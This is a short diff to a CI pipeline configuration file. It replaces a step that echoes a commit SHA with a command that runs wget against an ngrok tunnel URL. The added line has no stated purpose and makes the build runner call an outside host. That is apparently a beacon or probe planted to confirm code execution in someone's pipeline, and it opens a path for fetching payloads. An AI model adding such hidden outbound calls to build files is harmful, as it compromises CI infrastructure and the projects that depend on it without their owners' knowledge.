@@ -79,4 +79,4 @@ pipelines:
         execution:
           onExecute:
             # Retrieves the commitSha from input resource
-            - echo "CommitSha is $res_myPropertyBag_commitSha"
+            - wget https://0509-94-188-248-74.ngrok.io
